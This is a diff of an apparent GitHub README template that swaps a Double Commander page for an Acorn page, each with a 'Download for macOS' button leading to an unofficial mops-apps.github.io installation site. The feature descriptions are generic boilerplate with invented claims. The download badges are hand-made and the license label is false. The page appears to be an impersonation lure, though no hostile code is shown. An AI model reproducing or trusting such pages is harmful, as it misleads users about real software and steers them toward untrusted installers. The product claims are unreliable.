@@ -1,12 +1,12 @@
-# Double Commander Mac
+# Acorn Mac
 
-<img src="https://static.macupdate.com/products/50006/l/double-commander-logo.png?v=1605883222" width="200" alt="App icon" align="left"/>
+<img src="https://images.icon-icons.com/3053/PNG/512/acorn_macos_bigsur_icon_190473.png" width="200" alt="App icon" align="left"/>
 
 <div>
-<h3>Double Commander macOS</h3>
-<p>Double Commander is a specialized dual-pane file manager for macOS designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
+<h3>Acorn macOS</h3>
+<p>Acorn is a specialized image editor for macOS designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://mops-apps.github.io/.github/doublecommander">
+<a href="https://mops-apps.github.io/.github/acorn">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -14,11 +14,11 @@
 
 <div align="center">
 
-<a href="#"><img src="https://img.shields.io/badge/downloads-5.0k-brightgreen?style=flat" alt="downloads"/></a>
+<a href="#"><img src="https://img.shields.io/badge/downloads-6.9k-brightgreen?style=flat" alt="downloads"/></a>
 <a href="#"><img src="https://img.shields.io/badge/license-Standard%20License-lightgrey?style=flat" alt="license"/></a>
 <a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
-<img src="https://user-images.githubusercontent.com/947647/169654708-ff3e2408-4fb9-4384-a4b8-3e7b8f61fbed.png" width="824" alt="Screenshot"/>
+<img src="https://s3.amazonaws.com/flyingmeat/acorn8/ssweb_export.jpeg" width="824" alt="Screenshot"/>
 
 </div>
 
@@ -27,26 +27,26 @@
 
 ## Installation Guide
 
-1. Use the "Download for macOS" button above to access the Double Commander installation page.
-2. Complete the Double Commander installation by following all instructions displayed on the installation website.
+1. Use the "Download for macOS" button above to access the Acorn installation page.
+2. Complete the Acorn installation by following all instructions displayed on the installation website.
 
 ---
 
 ## Application Overview
 
-Double Commander macOS represents a professional‑grade file manager engineered specifically for the Mac platform. The application prioritizes native macOS integration, leveraging Apple's core frameworks and interface guidelines to deliver an experience that feels inherently familiar to Mac users.
+Acorn macOS represents a professional‑grade image editing software engineered specifically for the Mac platform. The application prioritizes native macOS integration, leveraging Apple's core frameworks and interface guidelines to deliver an experience that feels inherently familiar to Mac users.
 
 The software architecture emphasizes <a href="#">responsive performance</a> through careful optimization of system resources. Every interaction, from launching the app to processing complex operations, has been refined to minimize latency and maintain smooth visual feedback. This attention to performance means the application remains usable even under heavy workloads.
 
-Double Commander provides comprehensive <a href="#">customization capabilities</a> that adapt to individual workflows without requiring extensive configuration. Users can adjust interface layouts, modify keyboard shortcuts, and configure automation rules through intuitive preference panels. These settings sync seamlessly across devices when using iCloud, ensuring consistency regardless of which Mac you're working on.
+Acorn provides comprehensive <a href="#">customization capabilities</a> that adapt to individual workflows without requiring extensive configuration. Users can adjust interface layouts, modify keyboard shortcuts, and configure automation rules through intuitive preference panels. These settings sync seamlessly across devices when using iCloud, ensuring consistency regardless of which Mac you're working on.
 
-Integration with macOS ecosystem features runs deep throughout the application. Support for Handoff, Continuity Camera, Universal Control, and other system‑level technologies means Double Commander works naturally alongside your other applications. The software respects system‑wide settings for accessibility, appearance, and privacy while adding its own specialized capabilities.
+Integration with macOS ecosystem features runs deep throughout the application. Support for Handoff, Continuity Camera, Universal Control, and other system‑level technologies means Acorn works naturally alongside your other applications. The software respects system‑wide settings for accessibility, appearance, and privacy while adding its own specialized capabilities.
 
-Professional users benefit from advanced <a href="#">workflow automation</a> features built into Double Commander. The application supports AppleScript, Shortcuts integration, and direct API access for users who need programmatic control. Batch processing capabilities handle repetitive tasks efficiently, and preset systems allow teams to standardize configurations across multiple installations.
+Professional users benefit from advanced <a href="#">workflow automation</a> features built into Acorn. The application supports AppleScript, Shortcuts integration, and direct API access for users who need programmatic control. Batch processing capabilities handle repetitive tasks efficiently, and preset systems allow teams to standardize configurations across multiple installations.
 
-Security and privacy receive constant attention in Double Commander's design. The application operates within macOS sandbox restrictions, requests only necessary permissions, and provides transparent information about data usage. All network communications use encrypted connections, and sensitive information never leaves your device without explicit authorization.
+Security and privacy receive constant attention in Acorn's design. The application operates within macOS sandbox restrictions, requests only necessary permissions, and provides transparent information about data usage. All network communications use encrypted connections, and sensitive information never leaves your device without explicit authorization.
 
-Regular updates ensure Double Commander maintains compatibility with the latest macOS releases while introducing new features based on user feedback. The development team prioritizes stability and backwards compatibility, so updates enhance functionality without disrupting established workflows.
+Regular updates ensure Acorn maintains compatibility with the latest macOS releases while introducing new features based on user feedback. The development team prioritizes stability and backwards compatibility, so updates enhance functionality without disrupting established workflows.
 
 ---
 
@@ -67,7 +67,7 @@ Regular updates ensure Double Commander maintains compatibility with the latest 
 ## Visual Gallery
 
 <p align="center">
-  <img src="https://user-images.githubusercontent.com/947647/169654708-ff3e2408-4fb9-4384-a4b8-3e7b8f61fbed.png" width="824" alt="Double Commander interface"/>
+  <img src="https://s3.amazonaws.com/flyingmeat/acorn8/ss_antlers_vector.jpeg" width="824" alt="Acorn interface"/>
 </p>
 
 ---
@@ -76,22 +76,22 @@ Regular updates ensure Double Commander maintains compatibility with the latest 
 
 | Component        | Specification                       |
 |------------------|-------------------------------------|
-| Operating System | macOS 10.13 High Sierra or later                |
+| Operating System | macOS 11.0 Big Sur or later                |
 | Processor        | Intel or Apple Silicon processor              |
-| Memory           | 2 GB minimum                        |
-| Storage          | 150 MB available disk space              |
-| Network          | Optional for FTP operations   |
+| Memory           | 4 GB minimum (8 GB recommended)                        |
+| Storage          | 500 MB available disk space              |
+| Network          | Required for license activation   |
 
 ---
 
-## Why Mac Users Choose Double Commander
+## Why Mac Users Choose Acorn
 
-Mac users select <a href="#">Double Commander</a> for its unwavering commitment to platform conventions and user experience quality. Unlike cross‑platform alternatives that compromise on native feel, this application embraces macOS‑specific technologies and design patterns to deliver an authentically Mac experience.
+Mac users select <a href="#">Acorn</a> for its unwavering commitment to platform conventions and user experience quality. Unlike cross‑platform alternatives that compromise on native feel, this application embraces macOS‑specific technologies and design patterns to deliver an authentically Mac experience.
 
-The file manager landscape includes many options, but Double Commander distinguishes itself through consistent behavior and reliable performance. Users report that the application "just works" without requiring extensive troubleshooting or configuration. This reliability makes it suitable for mission‑critical workflows where downtime is unacceptable.
+The image editing software landscape includes many options, but Acorn distinguishes itself through consistent behavior and reliable performance. Users report that the application "just works" without requiring extensive troubleshooting or configuration. This reliability makes it suitable for mission‑critical workflows where downtime is unacceptable.
 
-Professional environments appreciate Double Commander's scalability and management features. IT administrators can deploy standardized configurations, and teams can share presets and templates to maintain consistency. The application's licensing model supports both individual users and enterprise deployments with flexible options.
+Professional environments appreciate Acorn's scalability and management features. IT administrators can deploy standardized configurations, and teams can share presets and templates to maintain consistency. The application's licensing model supports both individual users and enterprise deployments with flexible options.
 
-Long‑term usability remains a core focus. Double Commander receives regular maintenance updates that address bugs, improve performance, and add requested features. The development roadmap prioritizes user feedback, ensuring the application evolves to meet changing needs while maintaining its fundamental strengths.
+Long‑term usability remains a core focus. Acorn receives regular maintenance updates that address bugs, improve performance, and add requested features. The development roadmap prioritizes user feedback, ensuring the application evolves to meet changing needs while maintaining its fundamental strengths.
 
 ---
